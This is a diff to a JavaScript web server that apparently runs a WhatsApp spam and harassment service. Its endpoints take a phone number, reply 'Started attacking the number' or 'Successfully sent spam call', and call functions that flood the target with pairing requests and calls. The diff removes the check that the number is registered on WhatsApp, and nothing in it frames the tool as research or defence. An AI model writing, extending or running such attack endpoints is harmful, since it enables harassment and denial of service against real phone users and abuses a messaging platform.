@@ -187,14 +187,7 @@ const jid = toWhatsAppJID(target); // Convert phone number to JID
     const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
     if (!target || !phoneNumberPattern.test(target)) {
         return res.status(400).send('Phone number you have provided is invalid');
-    }
-    
-    // Check if the number is registered on WhatsApp
-    const contactInfo = await sam.onWhatsApp(target);
-    if (contactInfo.length === 0) {
-        return res.status(404).send('The number is not registered on WhatsApp');
-    }
-    
+    }    
     try {
     	res.send(`Started attacking the number ${target}`);
         await SendPairing(target); // Pass validated phone number to the function
@@ -222,13 +215,6 @@ await XeonBotInc.offerCall(jid);
     if (!target || !phoneNumberPattern.test(target)) {
         return res.status(400).send('Phone number you have provided is invalid');
     }
-    
-    // Check if the number is registered on WhatsApp
-    const contactInfo = await sam.onWhatsApp(target);
-    if (contactInfo.length === 0) {
-        return res.status(404).send('The number is not registered on WhatsApp');
-    }
-
     try {
     	res.send(`🕷️ Successfully sent spam call to the number ${target}`);
         await samCallSpam(target); // Pass validated phone number to the function
